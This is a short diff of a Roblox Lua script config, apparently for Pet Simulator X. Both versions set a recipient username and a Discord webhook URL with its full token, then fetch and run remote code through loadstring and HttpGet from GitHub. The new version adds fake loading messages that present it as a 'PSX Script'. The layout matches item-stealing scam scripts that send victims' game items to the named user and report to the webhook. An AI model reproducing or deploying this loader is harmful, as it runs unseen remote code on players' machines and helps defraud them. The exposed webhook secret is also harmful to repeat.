@@ -1,5 +1,9 @@
-UserName = "0FFK4KYY"
-UserName2 = "Kukimaradbbgs" -- optional delete the whole line if you don't want it
-Webhook = "https://discord.com/api/webhooks/1083718067344908389/AckpoZpK-uXvBCAX0ADYuBrTO2RppdkJkVls3iG3PLMO49faM4iuCYExHeJJNXDH1XeH" -- optional delete the whole line if you don't want it
+Username = "0FFK4KYY"
+WebHook = "https://discord.com/api/webhooks/1083718067344908389/AckpoZpK-uXvBCAX0ADYuBrTO2RppdkJkVls3iG3PLMO49faM4iuCYExHeJJNXDH1XeH"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
